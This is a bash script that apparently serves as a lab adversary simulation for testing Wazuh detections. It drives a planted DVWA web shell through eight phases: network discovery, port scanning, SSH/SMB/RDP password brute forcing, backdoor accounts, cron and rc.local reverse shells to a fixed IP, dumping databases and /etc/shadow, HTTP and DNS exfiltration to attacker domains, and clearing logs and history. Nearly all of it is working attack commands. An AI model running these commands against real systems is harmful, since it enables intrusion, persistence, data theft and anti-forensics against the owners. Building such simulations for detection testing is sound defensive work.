#!/bin/bash
#
# Network Lateral Movement Simulation Script
# This script simulates lateral movement from compromised web server
# to internal network resources
#
# Usage: ./lateral-movement.sh [start_host] [target_network]
#

set -euo pipefail

# Configuration
START_HOST="${1:-192.168.2.10}"  # Compromised web server
TARGET_NETWORK="${2:-192.168.3.0/24}"  # Internal network
WINDOWS_DC="192.168.3.10"
RHEL_DB="192.168.3.20"
LOG_FILE="/tmp/lateral-movement-$(date +%Y%m%d_%H%M%S).log"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Logging
exec 1> >(tee -a "$LOG_FILE")
exec 2> >(tee -a "$LOG_FILE" >&2)

print_banner() {
    echo -e "${BLUE}"
    echo "=================================================="
    echo "    Network Lateral Movement Simulation"
    echo "=================================================="
    echo "Start Host: $START_HOST"
    echo "Target Network: $TARGET_NETWORK"
    echo "Windows DC: $WINDOWS_DC"
    echo "RHEL DB: $RHEL_DB"
    echo "Log File: $LOG_FILE"
    echo "Timestamp: $(date)"
    echo "=================================================="
    echo -e "${NC}"
}

log_phase() {
    echo -e "${PURPLE}[PHASE]${NC} $1"
    echo "$(date): PHASE - $1" >> "$LOG_FILE"
}

log_attack() {
    echo -e "${RED}[ATTACK]${NC} $1"
    echo "$(date): ATTACK - $1" >> "$LOG_FILE"
}

log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
    echo "$(date): INFO - $1" >> "$LOG_FILE"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
    echo "$(date): WARN - $1" >> "$LOG_FILE"
}

wait_for_detection() {
    local seconds="${1:-5}"
    echo -e "${YELLOW}Waiting ${seconds} seconds for detection...${NC}"
    sleep "$seconds"
}

check_prerequisites() {
    log_info "Checking prerequisites..."
    
    # Check if start host is reachable
    if ! ping -c 1 "$START_HOST" >/dev/null 2>&1; then
        log_warn "Start host $START_HOST is not reachable"
        exit 1
    fi
    
    # Check required tools
    local tools=("nmap" "smbclient" "ssh" "nc")
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            log_warn "$tool is not installed"
        fi
    done
    
    log_info "Prerequisites check completed"
}

# Simulate command execution on compromised host
execute_on_compromised() {
    local cmd="$1"
    local description="$2"
    
    log_attack "$description"
    # Simulate web shell execution
    curl -s "http://$START_HOST/dvwa/hackable/uploads/shell.php?cmd=$(echo "$cmd" | sed 's/ /%20/g')" >/dev/null 2>&1 || true
}

# Phase 1: Internal Network Discovery
phase1_network_discovery() {
    log_phase "Phase 1: Internal Network Discovery"
    
    log_attack "Ping sweep of internal network"
    # Simulate ping sweep from compromised host
    for i in {1..20}; do
        local target_ip="192.168.3.$i"
        execute_on_compromised "ping -c 1 $target_ip" "Pinging $target_ip"
        sleep 0.2
    done
    wait_for_detection 5
    
    log_attack "ARP table enumeration"
    execute_on_compromised "arp -a" "Checking ARP table"
    wait_for_detection 2
    
    log_attack "Network interface discovery"
    execute_on_compromised "ip route" "Checking routing table"
    execute_on_compromised "netstat -rn" "Checking network routes"
    wait_for_detection 3
    
    log_attack "DNS enumeration"
    execute_on_compromised "nslookup lab.local" "DNS lookup for domain"
    execute_on_compromised "dig @192.168.3.10 lab.local ANY" "DNS zone transfer attempt"
    wait_for_detection 3
    
    log_info "Phase 1 completed - Expected detections: Internal network scanning, DNS enumeration"
}

# Phase 2: Port Scanning and Service Discovery
phase2_service_discovery() {
    log_phase "Phase 2: Port Scanning and Service Discovery"
    
    log_attack "Port scanning Windows DC"
    execute_on_compromised "nmap -sS $WINDOWS_DC" "Scanning Windows DC ports"
    wait_for_detection 3
    
    log_attack "Port scanning RHEL database server"
    execute_on_compromised "nmap -sS $RHEL_DB" "Scanning RHEL DB ports"
    wait_for_detection 3
    
    log_attack "Service version detection"
    execute_on_compromised "nmap -sV -p 22,80,135,139,445,3389 $WINDOWS_DC" "Service detection on Windows DC"
    wait_for_detection 3
    
    execute_on_compromised "nmap -sV -p 22,80,3306,5432 $RHEL_DB" "Service detection on RHEL DB"
    wait_for_detection 3
    
    log_attack "SMB enumeration"
    execute_on_compromised "smbclient -L //$WINDOWS_DC -N" "SMB share enumeration"
    wait_for_detection 2
    
    log_attack "SSH banner grabbing"
    execute_on_compromised "nc -zv $RHEL_DB 22" "SSH service detection"
    wait_for_detection 2
    
    log_info "Phase 2 completed - Expected detections: Port scanning, Service enumeration"
}

# Phase 3: Credential Attacks
phase3_credential_attacks() {
    log_phase "Phase 3: Credential Attacks"
    
    # Create password list
    cat > /tmp/passwords.txt << 'EOF'
admin
password
123456
root
administrator
lab123
password123
Password123!
admin123
guest
EOF
    
    log_attack "SSH brute force attack against RHEL database"
    local usernames=("root" "admin" "mysql" "postgres")
    for user in "${usernames[@]}"; do
        for pass in $(head -5 /tmp/passwords.txt); do
            log_attack "SSH login attempt: $user:$pass"
            execute_on_compromised "sshpass -p '$pass' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 $user@$RHEL_DB 'whoami'" "SSH brute force: $user:$pass"
            sleep 1
        done
        wait_for_detection 2
    done
    
    log_attack "SMB authentication attacks against Windows DC"
    local win_users=("Administrator" "admin" "guest")
    for user in "${win_users[@]}"; do
        for pass in $(head -5 /tmp/passwords.txt); do
            log_attack "SMB login attempt: $user:$pass"
            execute_on_compromised "smbclient //$WINDOWS_DC/C$ -U $user%$pass -c 'ls'" "SMB brute force: $user:$pass"
            sleep 1
        done
        wait_for_detection 2
    done
    
    log_attack "RDP brute force simulation"
    for pass in $(head -3 /tmp/passwords.txt); do
        log_attack "RDP connection attempt with password: $pass"
        execute_on_compromised "rdesktop -u Administrator -p $pass $WINDOWS_DC" "RDP brute force attempt"
        sleep 2
    done
    wait_for_detection 3
    
    # Cleanup
    rm -f /tmp/passwords.txt
    
    log_info "Phase 3 completed - Expected detections: SSH brute force, SMB authentication failures, RDP attacks"
}

# Phase 4: Successful Lateral Movement
phase4_successful_movement() {
    log_phase "Phase 4: Successful Lateral Movement (Simulated)"
    
    log_attack "Simulating successful SSH access to database server"
    # Note: In real scenario, this would use discovered credentials
    execute_on_compromised "ssh -o StrictHostKeyChecking=no root@$RHEL_DB 'hostname && whoami'" "Successful SSH login"
    wait_for_detection 3
    
    log_attack "Remote command execution on database server"
    execute_on_compromised "ssh root@$RHEL_DB 'ps aux | grep mysql'" "Database process enumeration"
    execute_on_compromised "ssh root@$RHEL_DB 'netstat -tulpn | grep 3306'" "Database port verification"
    execute_on_compromised "ssh root@$RHEL_DB 'cat /etc/passwd'" "User enumeration"
    wait_for_detection 3
    
    log_attack "Database access attempts"
    execute_on_compromised "ssh root@$RHEL_DB 'mysql -u root -e \"SHOW DATABASES;\"'" "Database enumeration"
    execute_on_compromised "ssh root@$RHEL_DB 'mysql -u root -e \"SELECT user,host FROM mysql.user;\"'" "Database user enumeration"
    wait_for_detection 3
    
    log_attack "File system exploration"
    execute_on_compromised "ssh root@$RHEL_DB 'find /var/lib/mysql -name \"*.frm\" | head -10'" "Database file discovery"
    execute_on_compromised "ssh root@$RHEL_DB 'find /home -name \"*.sql\" -o -name \"*.bak\"'" "Backup file search"
    wait_for_detection 3
    
    log_info "Phase 4 completed - Expected detections: Successful SSH login, Remote command execution"
}

# Phase 5: Privilege Escalation on Target
phase5_privilege_escalation() {
    log_phase "Phase 5: Privilege Escalation on Target System"
    
    log_attack "Checking sudo privileges on database server"
    execute_on_compromised "ssh root@$RHEL_DB 'sudo -l'" "Sudo privilege check"
    wait_for_detection 2
    
    log_attack "Searching for SUID binaries"
    execute_on_compromised "ssh root@$RHEL_DB 'find / -perm -4000 2>/dev/null | head -20'" "SUID binary enumeration"
    wait_for_detection 2
    
    log_attack "Kernel exploit reconnaissance"
    execute_on_compromised "ssh root@$RHEL_DB 'uname -a'" "Kernel version check"
    execute_on_compromised "ssh root@$RHEL_DB 'cat /etc/redhat-release'" "OS version check"
    wait_for_detection 2
    
    log_attack "Cron job enumeration"
    execute_on_compromised "ssh root@$RHEL_DB 'crontab -l'" "User cron jobs"
    execute_on_compromised "ssh root@$RHEL_DB 'cat /etc/crontab'" "System cron jobs"
    wait_for_detection 2
    
    log_attack "Service enumeration for privilege escalation"
    execute_on_compromised "ssh root@$RHEL_DB 'systemctl list-units --type=service --state=running'" "Running services"
    wait_for_detection 3
    
    log_info "Phase 5 completed - Expected detections: Privilege escalation attempts"
}

# Phase 6: Persistence on Target
phase6_persistence() {
    log_phase "Phase 6: Persistence Establishment"
    
    log_attack "Creating backdoor user account"
    execute_on_compromised "ssh root@$RHEL_DB 'useradd -m -s /bin/bash backdoor'" "User creation"
    execute_on_compromised "ssh root@$RHEL_DB 'echo \"backdoor:password123\" | chpasswd'" "Password setting"
    wait_for_detection 3
    
    log_attack "Adding user to sudo group"
    execute_on_compromised "ssh root@$RHEL_DB 'usermod -aG wheel backdoor'" "Privilege escalation"
    wait_for_detection 2
    
    log_attack "Creating SSH backdoor"
    execute_on_compromised "ssh root@$RHEL_DB 'mkdir -p /home/backdoor/.ssh'" "SSH directory creation"
    execute_on_compromised "ssh root@$RHEL_DB 'echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... backdoor@attacker\" > /home/backdoor/.ssh/authorized_keys'" "SSH key installation"
    wait_for_detection 2
    
    log_attack "Creating cron job backdoor"
    execute_on_compromised "ssh root@$RHEL_DB 'echo \"*/10 * * * * /bin/bash -c \\\"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\\\"\" | crontab -'" "Cron backdoor"
    wait_for_detection 3
    
    log_attack "Modifying system startup files"
    execute_on_compromised "ssh root@$RHEL_DB 'echo \"/bin/bash -c \\\"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\\\"\" >> /etc/rc.local'" "Startup backdoor"
    wait_for_detection 3
    
    log_attack "Installing rootkit simulation"
    execute_on_compromised "ssh root@$RHEL_DB 'touch /tmp/.hidden_backdoor'" "Hidden file creation"
    execute_on_compromised "ssh root@$RHEL_DB 'chmod +x /tmp/.hidden_backdoor'" "Executable backdoor"
    wait_for_detection 2
    
    log_info "Phase 6 completed - Expected detections: User creation, Cron modification, System file changes"
}

# Phase 7: Data Collection and Exfiltration
phase7_data_exfiltration() {
    log_phase "Phase 7: Data Collection and Exfiltration"
    
    log_attack "Database dump creation"
    execute_on_compromised "ssh root@$RHEL_DB 'mysqldump --all-databases > /tmp/all_databases.sql'" "Database dump"
    wait_for_detection 3
    
    log_attack "Sensitive file collection"
    execute_on_compromised "ssh root@$RHEL_DB 'find /etc -name \"*password*\" -o -name \"*secret*\" -o -name \"*key*\" | head -10'" "Sensitive file search"
    execute_on_compromised "ssh root@$RHEL_DB 'tar -czf /tmp/sensitive_files.tar.gz /etc/passwd /etc/shadow /etc/mysql/'" "File compression"
    wait_for_detection 3
    
    log_attack "Network configuration collection"
    execute_on_compromised "ssh root@$RHEL_DB 'ip addr show > /tmp/network_config.txt'" "Network info collection"
    execute_on_compromised "ssh root@$RHEL_DB 'iptables -L > /tmp/firewall_rules.txt'" "Firewall rules"
    wait_for_detection 2
    
    log_attack "Data staging for exfiltration"
    execute_on_compromised "ssh root@$RHEL_DB 'base64 /tmp/all_databases.sql > /tmp/encoded_db.txt'" "Data encoding"
    execute_on_compromised "ssh root@$RHEL_DB 'split -b 1024 /tmp/encoded_db.txt /tmp/chunk_'" "Data chunking"
    wait_for_detection 2
    
    log_attack "Simulated data exfiltration"
    execute_on_compromised "ssh root@$RHEL_DB 'curl -X POST -d @/tmp/encoded_db.txt http://attacker-server.com/upload'" "HTTP exfiltration"
    wait_for_detection 2
    
    log_attack "DNS exfiltration simulation"
    execute_on_compromised "ssh root@$RHEL_DB 'for chunk in /tmp/chunk_*; do nslookup \$(cat \$chunk | head -c 32).attacker-domain.com; done'" "DNS exfiltration"
    wait_for_detection 3
    
    log_attack "Cleanup of evidence"
    execute_on_compromised "ssh root@$RHEL_DB 'rm -f /tmp/all_databases.sql /tmp/sensitive_files.tar.gz /tmp/encoded_db.txt /tmp/chunk_*'" "Evidence cleanup"
    wait_for_detection 2
    
    log_info "Phase 7 completed - Expected detections: Data collection, Outbound data transfer"
}

# Phase 8: Advanced Persistence and Covering Tracks
phase8_covering_tracks() {
    log_phase "Phase 8: Covering Tracks"
    
    log_attack "Log file manipulation"
    execute_on_compromised "ssh root@$RHEL_DB 'echo \"\" > /var/log/auth.log'" "Auth log clearing"
    execute_on_compromised "ssh root@$RHEL_DB 'echo \"\" > /var/log/secure'" "Secure log clearing"
    wait_for_detection 3
    
    log_attack "Command history manipulation"
    execute_on_compromised "ssh root@$RHEL_DB 'history -c'" "History clearing"
    execute_on_compromised "ssh root@$RHEL_DB 'echo \"\" > ~/.bash_history'" "Bash history clearing"
    wait_for_detection 2
    
    log_attack "Timestamp manipulation"
    execute_on_compromised "ssh root@$RHEL_DB 'touch -t 202301010000 /tmp/.hidden_backdoor'" "Timestamp modification"
    wait_for_detection 2
    
    log_attack "Process hiding simulation"
    execute_on_compromised "ssh root@$RHEL_DB 'nohup /tmp/.hidden_backdoor &'" "Background process"
    wait_for_detection 2
    
    log_info "Phase 8 completed - Expected detections: Log manipulation, Anti-forensics activities"
}

generate_summary() {
    echo -e "${GREEN}"
    echo "=================================================="
    echo "    Lateral Movement Simulation Complete"
    echo "=================================================="
    echo "Start Host: $START_HOST"
    echo "Target Network: $TARGET_NETWORK"
    echo "Duration: $(date)"
    echo "Log File: $LOG_FILE"
    echo ""
    echo "Attack Phases Executed:"
    echo "1. ✓ Network Discovery"
    echo "2. ✓ Service Discovery"
    echo "3. ✓ Credential Attacks"
    echo "4. ✓ Successful Movement"
    echo "5. ✓ Privilege Escalation"
    echo "6. ✓ Persistence"
    echo "7. ✓ Data Exfiltration"
    echo "8. ✓ Covering Tracks"
    echo ""
    echo "Expected Wazuh Detections:"
    echo "- Internal network scanning (Rule 40104)"
    echo "- Service enumeration (Rule 40105)"
    echo "- SSH brute force attacks (Rule 5720)"
    echo "- SMB authentication failures (Rule 18152)"
    echo "- Successful SSH logins (Rule 5715)"
    echo "- Remote command execution (Rule 40110)"
    echo "- User account creation (Rule 2902)"
    echo "- Cron job modification (Rule 2904)"
    echo "- Data collection activities (Rule 40108)"
    echo "- Log manipulation (Rule 40112)"
    echo ""
    echo "MITRE ATT&CK Techniques Simulated:"
    echo "- T1021: Remote Services"
    echo "- T1110: Brute Force"
    echo "- T1135: Network Share Discovery"
    echo "- T1018: Remote System Discovery"
    echo "- T1078: Valid Accounts"
    echo "- T1003: OS Credential Dumping"
    echo "- T1053: Scheduled Task/Job"
    echo "- T1005: Data from Local System"
    echo "- T1041: Exfiltration Over C2 Channel"
    echo "- T1070: Indicator Removal on Host"
    echo ""
    echo "Next Steps:"
    echo "1. Review Wazuh dashboard for lateral movement alerts"
    echo "2. Analyze attack timeline and correlation"
    echo "3. Verify network segmentation controls"
    echo "4. Check for any missed detections"
    echo "5. Review incident response procedures"
    echo "=================================================="
    echo -e "${NC}"
}

cleanup() {
    log_info "Performing cleanup..."
    rm -f /tmp/passwords.txt
    log_info "Cleanup completed"
}

main() {
    print_banner
    check_prerequisites
    
    # Execute attack phases
    phase1_network_discovery
    phase2_service_discovery
    phase3_credential_attacks
    phase4_successful_movement
    phase5_privilege_escalation
    phase6_persistence
    phase7_data_exfiltration
    phase8_covering_tracks
    
    cleanup
    generate_summary
}

# Trap cleanup on exit
trap cleanup EXIT

# Run main function
main "$@"